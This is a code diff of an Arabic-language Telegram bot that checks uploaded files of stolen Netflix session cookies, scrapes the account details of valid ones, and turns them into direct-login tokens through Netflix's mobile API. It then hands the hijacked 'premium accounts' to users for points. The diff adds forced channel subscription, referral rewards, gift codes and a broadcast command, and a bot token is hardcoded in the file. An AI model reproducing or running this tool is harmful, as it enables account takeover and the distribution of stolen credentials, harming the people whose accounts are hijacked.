@@ -19,52 +19,77 @@ import random
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Owner credit & Channel info
-OWNER_CREDIT = "Faris - https://t.me/@farxxes"
+# Owner credit & Channel info (تم تحديث رابط قناتك بدقة)
+OWNER_CREDIT = "Faris - https://t.me/faresschannel"
 CHANNEL_LINK = "https://t.me/faresschannel"
+CHANNEL_USERNAME = "@faresschannel"
 
 # إعدادات بوت التليجرام
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8795234711:AAHQh9fufbVd63QoICaFK8rwdRzHD9V91SI')
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# 👑 إعدادات المطور الخاصة بك (fares) - نقاط بلا حدود
+# 👑 إعدادات المطور الخاصة بك (فارس)
 DEVELOPER_ID = 8713916851
+DEVELOPER_USERNAME = "farxxes"
 
 STOCK_FILE = "stock_accounts.txt"
 USERS_FILE = "users_data.json"
+CODES_FILE = "gift_codes.json"
 
-# قاموس لتتبع عمليات الفحص الجارية وإمكانية إيقافها
 active_scans = {}
 
-def load_users():
-    if not os.path.exists(USERS_FILE):
+def load_data(filepath):
+    if not os.path.exists(filepath):
         return {}
     try:
-        with open(USERS_FILE, "r", encoding="utf-8") as f:
+        with open(filepath, "r", encoding="utf-8") as f:
             return json.load(f)
     except:
         return {}
 
-def save_users(users_data):
+def save_data(filepath, data):
     try:
-        with open(USERS_FILE, "w", encoding="utf-8") as f:
-            json.dump(users_data, f, indent=4)
+        with open(filepath, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=4)
     except Exception as e:
-        logger.error(f"Error saving users: {e}")
+        logger.error(f"Error saving data to {filepath}: {e}")
 
-def add_user_if_not_exists(user_id):
-    users = load_users()
+def check_subscription(user_id):
+    if int(user_id) == DEVELOPER_ID:
+        return True
+    try:
+        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        if member.status in ['member', 'administrator', 'creator']:
+            return True
+    except Exception as e:
+        logger.error(f"Sub check error: {e}")
+    return False
+
+def add_user_if_not_exists(user_id, referrer_id=None):
+    users = load_data(USERS_FILE)
     str_id = str(user_id)
     if str_id not in users:
-        # المطور يحصل تلقائياً على نقاط مالا نهاية (999999) والمستخدمين العاديين 3 نقاط
         initial_points = 999999 if int(user_id) == DEVELOPER_ID else 3
-        users[str_id] = {"points": initial_points, "joined_date": datetime.now().strftime('%Y-%m-%d')}
-        save_users(users)
+        users[str_id] = {
+            "points": initial_points, 
+            "joined_date": datetime.now().strftime('%Y-%m-%d'),
+            "referrals": 0
+        }
+        
+        # نظام الدعوات
+        if referrer_id and str(referrer_id) in users and str(referrer_id) != str_id:
+            users[str(referrer_id)]["points"] += 2  # منح 2 نقاط للمُحيل
+            users[str(referrer_id)]["referrals"] += 1
+            try:
+                bot.send_message(referrer_id, "🎉 انضم شخص جديد عبر رابط دعوتك! تم منحك `2` نقطة إضافية.", parse_mode='Markdown')
+            except:
+                pass
+                
+        save_data(USERS_FILE, users)
     else:
-        # تأكيد دائم بأن نقاط المطور لا تنتهي أبداً
         if int(user_id) == DEVELOPER_ID:
             users[str_id]["points"] = 999999
-            save_users(users)
+            save_data(USERS_FILE, users)
 
 def save_to_stock(account_text):
     try:
@@ -105,7 +130,6 @@ def unescape_plan(s):
         return s
 
 def format_billing_date(raw):
-    """Convert ISO 8601 billing date to dd/MM/yyyy"""
     try:
         raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
         clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
@@ -169,7 +193,6 @@ def extract_netflix_id(content):
     return None
 
 def extract_next_billing_date(response_text):
-    """Extract next billing date from GraphQL response"""
     try:
         billing_match = re.search(r'"nextBillingDate":\s*\{[^}]+\}', response_text)
         if billing_match:
@@ -193,99 +216,47 @@ def check_netflix_cookie(cookie_dict):
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1'
     }
-    
     try:
         resp = session.get(url, headers=headers, timeout=30)
         txt = resp.text
-        
         if any(phrase in txt.lower() for phrase in ['"mode":"login"']):
-            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
-        
+            return {'ok': False}
         if '"mode":"yourAccount"' not in txt:
-            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}
+            return {'ok': False}
 
         def find(pattern, text=txt):
             m = re.search(pattern, text)
             return m.group(1).strip() if m else None
 
-        plan = find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"')
-        plan = unescape_plan(plan) if plan else "Unknown"
-
-        plan_price = find(r'"planPrice"[^}]+"value":"([^"]+)"') or find(r'planPrice[^}]+value[^}]+"([^"]+)"')
-        plan_price = unescape_plan(plan_price) if plan_price else "Unknown"
-
-        member_since = find(r'"memberSince":"([^"]+)"')
-        member_since = unescape_plan(member_since) if member_since else "Unknown"
-
-        payment_method = find(r'"paymentMethod"[^}]+"value":"([^"]+)"') or "Unknown"
-        phone = find(r'"phoneNumberDigits"[^}]+"value":"([^"]+)"')
-        phone = phone.replace("\\x2B", "+") if phone else "Unknown"
-
-        phone_verified_match = re.search(r'"growthPhoneNumber"[^}]+"isVerified":(true|false)', txt)
-        phone_verified = "Yes" if phone_verified_match and phone_verified_match.group(1) == 'true' else "No"
-
-        video_quality = find(r'"videoQuality"[^}]+"value":"([^"]+)"') or "Unknown"
-        max_streams = find(r'"maxStreams"[^}]+"value":(\d+)') or "Unknown"
-
-        payment_hold_match = re.search(r'"growthHoldMetadata"[^}]+"isUserOnHold":(true|false)', txt)
-        payment_hold = "Yes" if payment_hold_match and payment_hold_match.group(1) == 'true' else "No"
-
-        extra_member_match = re.search(r'"showExtraMemberSection"[^}]+"value":(true|false)', txt)
-        extra_member = "Yes" if extra_member_match and extra_member_match.group(1) == 'true' else "No"
-
-        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
+        plan = unescape_plan(find(r'"planName"\s*:\s*"([^"]+)"') or find(r'localizedPlanName[^}]+"value":"([^"]+)"') or "Unknown")
+        plan_price = unescape_plan(find(r'"planPrice"[^}]+"value":"([^"]+)"') or "Unknown")
         country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
-        
         email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
         if email != "Unknown":
             email = urllib.parse.unquote(email)
-        
         next_billing = extract_next_billing_date(txt)
 
-        profiles = []
-        try:
-            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
-            for profile in profile_matches:
-                if profile and profile not in profiles:
-                    profiles.append(profile)
-        except Exception:
-            pass
-        profiles_str = ", ".join(profiles) if profiles else "Unknown"
+        profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', txt)
+        profiles_str = ", ".join(list(set(profiles))) if profiles else "Unknown"
 
         status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
-        is_premium = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
-        is_valid = bool(status_match)
-        
-        if not is_valid and "NetflixId" in cookie_dict:
-            is_valid = any(phrase in txt for phrase in ['Account & Billing', 'membershipStatus', 'planName'])
-            is_premium = is_valid
+        is_valid = bool(status_match and status_match.group(1) == 'CURRENT_MEMBER')
 
         return {
             'ok': is_valid,
-            'premium': is_premium,
             'country': country,
             'plan': plan,
             'plan_price': plan_price,
-            'member_since': member_since,
-            'payment_method': payment_method,
-            'phone': phone,
-            'phone_verified': phone_verified,
-            'video_quality': video_quality,
-            'max_streams': max_streams,
-            'on_payment_hold': payment_hold,
-            'extra_member': extra_member,
-            'email_verified': email_verified,
             'email': email,
             'profiles': profiles_str,
             'next_billing': format_billing_date(next_billing),
             'cookie': cookie_dict
         }
     except Exception as e:
-        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}
+        return {'ok': False}
 
 def generate_token(netflix_id):
     url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
@@ -309,99 +280,77 @@ def generate_token(netflix_id):
         'progressive': "false",
         'responseFormat': "json"
     }
-
     headers = {
         'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
-        'x-netflix.request.attempt': "1",
-        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
-        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
-        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
-        'x-netflix.context.app-version': "15.48.1",
-        'x-netflix.argo.translated': "true",
-        'x-netflix.context.form-factor': "phone",
-        'x-netflix.context.sdk-version': "2012.4",
-        'x-netflix.client.appversion': "15.48.1",
-        'x-netflix.context.max-device-width': "375",
-        'x-netflix.context.ab-tests': "",
-        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
-        'x-netflix.client.type': "argo",
-        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-        'x-netflix.context.locales': "en-US",
-        'x-netflix.argo.abtests': "",
-        'x-netflix.context.os-version': "15.8.5",
-        'x-netflix.request.client.context': '{"appState":"foreground"}',
-        'x-netflix.context.ui-flavor': "argo",
-        'x-netflix.argo.nfnsm': "9",
-        'x-netflix.context.pixel-density': "2.0",
-        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
-        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
         'Cookie': f"NetflixId={netflix_id}"
     }
-
     try:
         response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
         data = response.json()
-        
         if "value" in data and data["value"] and "account" in data["value"]:
             token_data = data["value"]["account"]["token"]["default"]
             token = token_data["token"]
-            expires = token_data["expires"]
-            
-            if len(str(expires)) == 13:
-                expires //= 1000
-                
-            generation_time = int(time.time())
-            time_remaining = expires - generation_time
-            
             return {
                 "status": "Success",
-                "generation_time": generation_time,
-                "expires": expires,
-                "time_remaining": time_remaining,
-                "token": token,
-                "direct_login_url": f"https://netflix.com/unsupported?nftoken={token}"
+                "token": token
             }
-        else:
-            return {"status": "Failure", "error": "No token found in response"}
     except Exception as e:
-        return {"status": "Error", "error": str(e)}
+        logger.error(f"Error in generate_token: {e}")
+    return {"status": "Failure"}
 
 def extract_zip_and_get_files(zip_path, extract_dir):
     txt_files = []
     try:
         with zipfile.ZipFile(zip_path, 'r') as zip_ref:
             zip_ref.extractall(extract_dir)
-        
         for root, dirs, files in os.walk(extract_dir):
             for file in files:
                 if file.lower().endswith('.txt'):
                     txt_files.append(os.path.join(root, file))
-        
         return txt_files
-    except Exception as e:
-        logger.error(f"Error extracting ZIP file: {e}")
+    except:
         return []
 
-# واجهة الأزرار عند البداية
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
-    add_user_if_not_exists(user_id)
     
+    # استخراج معرف الشخص الداعي إن وجد في رابط البدء (مثل /start ref12345)
+    args = message.text.split()
+    referrer_id = None
+    if len(args) > 1 and args[1].startswith('ref'):
+        try:
+            referrer_id = int(args[1].replace('ref', ''))
+        except:
+            pass
+            
+    add_user_if_not_exists(user_id, referrer_id)
+    
+    # فحص الاشتراك الإجباري في القناة
+    if not check_subscription(user_id):
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("📢 اشترك في قناة المطور", url=CHANNEL_LINK))
+        markup.add(InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_sub"))
+        bot.send_message(message.chat.id, f"⚠️ **عذراً يا عسل!**\nيجب عليك الاشتراค في قناتنا الرسمية أولاً لتتمكن من استخدام البوت:\n\n👉 {CHANNEL_LINK}", parse_mode='Markdown', reply_markup=markup)
+        return
+
+    show_main_menu(message.chat.id, user_id)
+
+def show_main_menu(chat_id, user_id):
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
     markup.add(
         InlineKeyboardButton("📂 فحص ملفات (TXT / ZIP)", callback_data="btn_check"),
         InlineKeyboardButton("🎁 سحب حساب من الذاكرة (نقاط بلا حدود)", callback_data="btn_stock"),
-        InlineKeyboardButton("💰 رصيدي النقدي", callback_data="btn_balance"),
-        InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
+        InlineKeyboardButton("👤 حسابي الشخصي وإحصائياتي", callback_data="btn_profile"),
+        InlineKeyboardButton("📢 قناة البوت الرسمية", url=CHANNEL_LINK)
     )
     
-    if user_id == DEVELOPER_ID:
+    if int(user_id) == DEVELOPER_ID:
         markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور (فارس)", callback_data="btn_admin"))
         
-    welcome_text = "🎬 **مرحباً بك في بوت فحص نتفليكس الإحترافي**\n👑 *المطور:* [fares](https://t.me/farxxes)\n\nاختر أحد الخيارات أدناه للبدء:"
-    bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=markup)
+    welcome_text = f"🎬 **أهلاً بك في بوت فحص نتفليكس الإحترافي**\n👑 *المطور:* [@{DEVELOPER_USERNAME}](https://t.me/{DEVELOPER_USERNAME})\n\nاختر أحد الخيارات أدناه للبدء:"
+    bot.send_message(chat_id, welcome_text, parse_mode='Markdown', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -409,25 +358,56 @@ def callback_query(call):
     users = load_users()
     str_id = str(user_id)
     
-    if call.data == "btn_check":
+    if call.data == "check_sub":
+        if check_subscription(user_id):
+            bot.answer_callback_query(call.id, text="✅ تم التحقق بنجاح!", show_alert=True)
+            try:
+                bot.delete_message(call.message.chat.id, call.message.message_id)
+            except:
+                pass
+            show_main_menu(call.message.chat.id, user_id)
+        else:
+            bot.answer_callback_query(call.id, text="❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
+            
+    elif call.data == "btn_check":
+        if not check_subscription(user_id):
+            bot.answer_callback_query(call.id, text="عليك الاشتراك في القناة أولاً!", show_alert=True)
+            return
         bot.answer_callback_query(call.id)
         bot.send_message(call.message.chat.id, "📂 **أرسل الآن ملف الكوكيز بصيغة `.txt` أو `.zip` وسأبدأ الفحص الفوري مع شاشة التقدم!**", parse_mode='Markdown')
         
-    elif call.data == "btn_balance":
-        points = "♾️ (رصيد غير محدود للمطور)" if user_id == DEVELOPER_ID else users.get(str_id, {}).get("points", 0)
-        bot.answer_callback_query(call.id, text=f"رصيدك الحالي هو: {points}", show_alert=True)
+    elif call.data == "btn_profile":
+        bot.answer_callback_query(call.id)
+        points = "♾️ (نقاط بلا حدود للمطور)" if user_id == DEVELOPER_ID else users.get(str_id, {}).get("points", 0)
+        joined = users.get(str_id, {}).get("joined_date", "اليوم")
+        refs = users.get(str_id, {}).get("referrals", 0)
+        bot_info = bot.get_me()
+        ref_link = f"https://t.me/{bot_info.username}?start=ref{user_id}"
+        
+        profile_text = (
+            "👤 **الملف الشخصي والإحصائيات**\n\n"
+            f"🆔 معرفك: `{user_id}`\n"
+            f"💰 رصيدك الحالي: `{points}`\n"
+            f"👥 عدد الأشخاص الذين دعوتهم: `{refs}` شخص\n"
+            f"📅 تاريخ الانضمام: `{joined}`\n\n"
+            f"🔗 **رابط الدعوة الخاص بك:**\n`{ref_link}`\n"
+            "*(شارك الرابط مع أصدقائك واربح نقطتين عن كل شخص ينضم!)*"
+        )
+        bot.send_message(call.message.chat.id, profile_text, parse_mode='Markdown')
         
     elif call.data == "btn_stock":
+        if not check_subscription(user_id):
+            bot.answer_callback_query(call.id, text="عليك الاشتراك في القناة أولاً!", show_alert=True)
+            return
         bot.answer_callback_query(call.id)
         
-        # إذا لم يكن مطوراً، نتحقق من نقاطه ونخصم نقطة
         if user_id != DEVELOPER_ID:
             current_points = users.get(str_id, {}).get("points", 0)
             if current_points < 1:
-                bot.send_message(call.message.chat.id, "❌ رصيدك غير كافٍ! تحتاج إلى نقطة واحدة (1) لسحب حساب من الذاكرة.")
+                bot.send_message(call.message.chat.id, "❌ رصيدك غير كافٍ! قم بدعوة أصدقائك عبر رابط الدعوة لجمع النقاط.")
                 return
             users[str_id]["points"] -= 1
-            save_users(users)
+            save_data(USERS_FILE, users)
         
         account = get_random_account_from_stock()
         if account:
@@ -441,7 +421,7 @@ def callback_query(call):
                     InlineKeyboardButton("📱 Phone Login", url=direct_url)
                 )
             
-            watermarked_acc = f"{account}\n\n👑 *Dev:* @farxxes | [Channel](https://t.me/faresschannel)"
+            watermarked_acc = f"{account}\n\n👑 *Dev:* @{DEVELOPER_USERNAME} | [Channel]({CHANNEL_LINK})"
             remaining_display = "♾️ (لا ينتهي)" if user_id == DEVELOPER_ID else users[str_id]['points']
             bot.send_message(call.message.chat.id, f"🌟 **PREMIUM ACCOUNT** 🌟\n\n{watermarked_acc}\n\n💰 رصيدك المتبقي: {remaining_display}", parse_mode='Markdown', reply_markup=markup if token_match else None)
         else:
@@ -460,12 +440,13 @@ def callback_query(call):
                 stock_count = f.read().count("="*40)
                 
         admin_text = (
-            "⚙️ **لوحة تحكم المطور (فارس)**\n\n"
+            f"⚙️ **لوحة تحكم المطور ({DEVELOPER_USERNAME})**\n\n"
             f"👥 إجمالي المستخدمين: `{total_users}`\n"
             f"📦 الحسابات المتاحة في الذاكرة: `{stock_count}` حساب\n"
             f"👑 رصيدك كـ مطور: `نقاط بلا حدود (♾️)`\n\n"
-            "▫️ لإضافة نقاط لمستخدم، أرسل الأمر بالشكل التالي:\n"
-            "`/addpoints [ID] [العدد]`"
+            "▫️ لإضافة نقاط لمستخدم:\n`/addpoints [ID] [العدد]`\n\n"
+            "▫️ لإنشاء كود هدية جديد:\n`/createcode [عدد النقاط]`\n\n"
+            "▫️ لإذاعة رسالة لجميع المستخدمين:\n`/broadcast [الرسالة]`"
         )
         bot.send_message(call.message.chat.id, admin_text, parse_mode='Markdown')
         
@@ -479,30 +460,109 @@ def callback_query(call):
 def add_points_command(message):
     if message.from_user.id != DEVELOPER_ID:
         return
-        
     parts = message.text.split()
     if len(parts) != 3:
-        bot.reply_to(message, "❌ الاستخدام الخاطئ للأمر. استخدم:\n`/addpoints [ID] [العدد]`", parse_mode='Markdown')
+        bot.reply_to(message, "❌ الاستخدام: `/addpoints [ID] [العدد]`", parse_mode='Markdown')
         return
-        
     target_id = parts[1]
     try:
         amount = int(parts[2])
     except:
         bot.reply_to(message, "❌ عدد النقاط يجب أن يكون رقماً صحيحاً.")
         return
-        
     users = load_users()
     if target_id in users:
         users[target_id]["points"] += amount
-        save_users(users)
-        bot.reply_to(message, f"✅ تمت إضافة {amount} نقطة بنجاح للمستخدم `{target_id}`.\n💰 رصيده الحالي: {users[target_id]['points']} نقطة", parse_mode='Markdown')
+        save_data(USERS_FILE, users)
+        bot.reply_to(message, f"✅ تمت إضافة {amount} نقطة بنجاح للمستخدم `{target_id}`.", parse_mode='Markdown')
     else:
-        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في قاعدة بيانات البوت بعد.")
+        bot.reply_to(message, "❌ هذا المستخدم غير مسجل في البوت.")
+
+@bot.message_handler(commands=['createcode'])
+def create_code_command(message):
+    if message.from_user.id != DEVELOPER_ID:
+        return
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "❌ الاستخدام: `/createcode [عدد النقاط]`", parse_mode='Markdown')
+        return
+    try:
+        points = int(parts[1])
+    except:
+        bot.reply_to(message, "❌ يرجى إدخال رقم صحيح للنقاط.")
+        return
+        
+    code = f"FARIS-{random.randint(1000, 9999)}-{random.randint(100, 999)}"
+    codes = load_data(CODES_FILE)
+    codes[code] = {"points": points, "used": False}
+    save_data(CODES_FILE, codes)
+    
+    bot.reply_to(message, f"🎁 **تم إنشاء كود الهدية بنجاح!**\n\n🔑 الكود: `{code}`\n💰 القيمة: `{points}` نقطة\n\nأرسله للمستخدمين لشحنه عبر أمر `/redeem [الكود]`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['redeem'])
+def redeem_code_command(message):
+    user_id = message.from_user.id
+    parts = message.text.split()
+    if len(parts) != 2:
+        bot.reply_to(message, "❌ الاستخدام الصحيح:\n`/redeem [الكود]`", parse_mode='Markdown')
+        return
+    code = parts[1].strip()
+    codes = load_data(CODES_FILE)
+    
+    if code not in codes:
+        bot.reply_to(message, "❌ هذا الكود غير صالح أو غير موجود.")
+        return
+        
+    if codes[code]["used"]:
+        bot.reply_to(message, "❌ تم استخدام هذا الكود من قبل!")
+        return
+        
+    points = codes[code]["points"]
+    codes[code]["used"] = True
+    save_data(CODES_FILE, codes)
+    
+    users = load_users()
+    str_id = str(user_id)
+    if str_id not in users:
+        add_user_if_not_exists(user_id)
+        users = load_users()
+        
+    users[str_id]["points"] += points
+    save_data(USERS_FILE, users)
+    
+    bot.reply_to(message, f"🎉 **مبروك يا غالي!**\nتم شحن الكود بنجاح وإضافة `{points}` نقطة إلى رصيدك.", parse_mode='Markdown')
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_command(message):
+    if message.from_user.id != DEVELOPER_ID:
+        return
+    text = message.text.replace('/broadcast', '').strip()
+    if not text:
+        bot.reply_to(message, "❌ اكتب النص المراد إذاعته بعد الأمر.")
+        return
+        
+    users = load_users()
+    success = 0
+    fail = 0
+    
+    status_msg = bot.reply_to(message, "📢 جاري إرسال الإذاعة لجميع المستخدمين...")
+    for uid in users:
+        try:
+            bot.send_message(uid, f"📢 **إعلان هام من المطور:**\n\n{text}", parse_mode='Markdown')
+            success += 1
+            time.sleep(0.1)
+        except:
+            fail += 1
+            
+    bot.edit_message_text(f"✅ **تمت الإذاعة بنجاح!**\n- الإرسال الناجح: `{success}`\n- الفاشل: `{fail}`", message.chat.id, status_msg.message_id, parse_mode='Markdown')
 
 @bot.message_handler(content_types=['document'])
 def handle_documents(message):
     user_id = message.from_user.id
+    if not check_subscription(user_id):
+        bot.reply_to(message, f"⚠️ يجب عليك الاشتراك في قناة البوت أولاً: {CHANNEL_LINK}")
+        return
+        
     add_user_if_not_exists(user_id)
     
     temp_dirs = []
@@ -608,7 +668,7 @@ def handle_documents(message):
                             InlineKeyboardButton("📱 Phone Login", url=fallback_url)
                         )
                         
-                    res_msg += f"\n👑 *Dev:* @farxxes | [Channel](https://t.me/farxxes)"
+                    res_msg += f"\n👑 *Dev:* @{DEVELOPER_USERNAME} | [Channel]({CHANNEL_LINK})"
                     
                     bot.send_message(message.chat.id, res_msg, parse_mode='Markdown', reply_markup=markup)
                     
@@ -623,7 +683,7 @@ def handle_documents(message):
             
         if valid_count > 0 and os.path.exists(result_file_path):
             with open(result_file_path, "rb") as rf:
-                bot.send_document(message.chat.id, rf, caption=f"📁 **ملف النتائج الشامل:** `the_premuim_account.txt`\n👑 *By Fares* (@farxxes)", parse_mode='Markdown')
+                bot.send_document(message.chat.id, rf, caption=f"📁 **ملف النتائج الشامل:** `the_premuim_account.txt`\n👑 *By Faris* (@{DEVELOPER_USERNAME})", parse_mode='Markdown')
                 
         bot.send_message(message.chat.id, f"✅ **انتهى الفحص بنجاح!**\n📊 إجمالي الحسابات الفعالة المكتشفة: `{valid_count}` حساب.\n👑 *Channel:* {CHANNEL_LINK}", parse_mode='Markdown')
         
@@ -639,5 +699,5 @@ def handle_documents(message):
                 pass
 
 if __name__ == '__main__':
-    logger.info("Telegram Bot is running for Faris with unlimited developer points...")
+    logger.info("Telegram Bot is running for Faris with all pro features enabled...")
     bot.infinity_polling()
